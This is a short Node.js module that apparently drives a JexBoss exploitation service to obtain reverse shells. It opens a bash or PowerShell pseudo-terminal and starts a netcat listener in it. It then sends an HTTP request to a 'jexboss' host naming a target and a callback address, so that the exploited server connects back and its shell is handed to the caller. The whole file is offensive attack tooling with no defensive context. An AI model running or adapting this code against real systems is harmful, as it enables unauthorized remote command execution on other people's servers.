
const { spawn } = require('child_process');
const { get } = require('http')
var os = require('os');
var pty = require('node-pty');
 
var shell = os.platform() === 'win32' ? 'powershell.exe' : 'bash';
 


module.exports = function(host,reverseHost,callback) {
 
    var ptyProcess = pty.spawn(shell, [], {
        name: 'xterm-color',
        cols: 80,
        rows: 30,
        cwd: process.env.HOME,
        env: process.env
      });
       

      ptyProcess.write(`nc -vv -l ${reverseHost.split(':')[1]}\r`);

      get(`http://jexboss:3000/?host=${host}&reverse=${reverseHost}`)

      

    callback(ptyProcess);
}

